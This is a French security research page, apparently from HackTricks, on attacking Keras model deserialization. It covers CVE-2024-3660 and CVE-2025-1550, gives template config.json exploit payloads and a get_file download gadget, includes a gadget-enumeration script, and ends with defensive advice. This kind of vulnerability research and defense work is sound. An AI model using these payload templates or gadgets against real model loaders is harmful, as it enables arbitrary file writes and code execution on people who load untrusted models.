# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Cette page résume les techniques d'exploitation pratiques contre le pipeline de désérialisation des modèles Keras, explique les détails internes du format .keras et la surface d'attaque, et fournit un kit d'outils pour les chercheurs afin de trouver des vulnérabilités de fichiers de modèle (MFVs) et des gadgets post-correction.

## Détails internes du format de modèle .keras

Un fichier .keras est une archive ZIP contenant au moins :
- metadata.json – informations génériques (par exemple, version de Keras)
- config.json – architecture du modèle (surface d'attaque principale)
- model.weights.h5 – poids en HDF5

Le config.json entraîne une désérialisation récursive : Keras importe des modules, résout des classes/fonctions et reconstruit des couches/objets à partir de dictionnaires contrôlés par l'attaquant.

Extrait d'exemple pour un objet de couche Dense :
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
La désérialisation effectue :
- Importation de modules et résolution de symboles à partir des clés module/class_name
- invocation de from_config(...) ou du constructeur avec des kwargs contrôlés par l'attaquant
- Récursion dans des objets imbriqués (activations, initialisateurs, contraintes, etc.)

Historiquement, cela a exposé trois primitives à un attaquant créant config.json :
- Contrôle des modules importés
- Contrôle des classes/fonctions résolues
- Contrôle des kwargs passés dans les constructeurs/from_config

## CVE-2024-3660 – Exécution de code à distance par bytecode de couche Lambda

Cause racine :
- Lambda.from_config() utilisait python_utils.func_load(...) qui décode en base64 et appelle marshal.loads() sur des octets de l'attaquant ; la désérialisation Python peut exécuter du code.

Idée d'exploitation (charge utile simplifiée dans config.json) :
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigation:
- Keras impose safe_mode=True par défaut. Les fonctions Python sérialisées dans Lambda sont bloquées à moins qu'un utilisateur ne choisisse explicitement de désactiver avec safe_mode=False.

Notes:
- Les formats hérités (anciens enregistrements HDF5) ou les anciennes bases de code peuvent ne pas appliquer les vérifications modernes, donc les attaques de style "downgrade" peuvent toujours s'appliquer lorsque les victimes utilisent des chargeurs plus anciens.

## CVE-2025-1550 – Importation de module arbitraire dans Keras ≤ 3.8

Root cause:
- _retrieve_class_or_fn utilisait importlib.import_module() sans restriction avec des chaînes de module contrôlées par l'attaquant provenant de config.json.
- Impact : Importation arbitraire de tout module installé (ou module planté par l'attaquant sur sys.path). Le code s'exécute au moment de l'importation, puis la construction de l'objet se produit avec des kwargs de l'attaquant.

Exploit idea:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Améliorations de la sécurité (Keras ≥ 3.9) :
- Liste blanche des modules : importations restreintes aux modules de l'écosystème officiel : keras, keras_hub, keras_cv, keras_nlp
- Mode sécurisé par défaut : safe_mode=True bloque le chargement de fonctions sérialisées Lambda non sécurisées
- Vérification de type de base : les objets désérialisés doivent correspondre aux types attendus

## Surface de gadgets post-correction à l'intérieur de la liste blanche

Même avec la liste blanche et le mode sécurisé, une large surface reste parmi les appelables Keras autorisés. Par exemple, keras.utils.get_file peut télécharger des URL arbitraires vers des emplacements sélectionnables par l'utilisateur.

Gadget via Lambda qui référence une fonction autorisée (pas de bytecode Python sérialisé) :
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Limitation importante :
- Lambda.call() ajoute le tenseur d'entrée comme le premier argument positionnel lors de l'invocation de l'appelable cible. Les gadgets choisis doivent tolérer un argument positionnel supplémentaire (ou accepter *args/**kwargs). Cela limite les fonctions viables.

Impacts potentiels des gadgets autorisés :
- Téléchargement/écriture arbitraire (plantation de chemin, empoisonnement de configuration)
- Rappels réseau/effets similaires à SSRF selon l'environnement
- Chaînage vers l'exécution de code si les chemins écrits sont ensuite importés/exécutés ou ajoutés à PYTHONPATH, ou si un emplacement d'exécution sur écriture accessible existe

## Boîte à outils du chercheur

1) Découverte systématique de gadgets dans les modules autorisés

Énumérer les appelables candidats à travers keras, keras_nlp, keras_cv, keras_hub et prioriser ceux ayant des effets secondaires sur les fichiers/réseaux/processus/environnement.
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
2) Test de désérialisation directe (aucune archive .keras nécessaire)

Alimentez des dictionnaires conçus directement dans les désérialiseurs Keras pour apprendre les paramètres acceptés et observer les effets secondaires.
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Probe croisée des versions et formats

Keras existe dans plusieurs bases de code/époques avec différentes protections et formats :
- Keras intégré à TensorFlow : tensorflow/python/keras (héritage, prévu pour suppression)
- tf-keras : maintenu séparément
- Keras 3 multi-backend (officiel) : introduction du .keras natif

Répétez les tests à travers les bases de code et les formats (.keras vs HDF5 hérité) pour découvrir des régressions ou des protections manquantes.

## Recommandations défensives

- Traitez les fichiers de modèle comme des entrées non fiables. Chargez uniquement des modèles provenant de sources de confiance.
- Gardez Keras à jour ; utilisez Keras ≥ 3.9 pour bénéficier de la liste blanche et des vérifications de type.
- Ne définissez pas safe_mode=False lors du chargement des modèles à moins de faire entièrement confiance au fichier.
- Envisagez d'exécuter la désérialisation dans un environnement isolé, avec le moins de privilèges possible, sans sortie réseau et avec un accès au système de fichiers restreint.
- Appliquez des listes blanches/signatures pour les sources de modèles et la vérification d'intégrité lorsque cela est possible.

## Références

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)

{{#include ../../banners/hacktricks-training.md}}
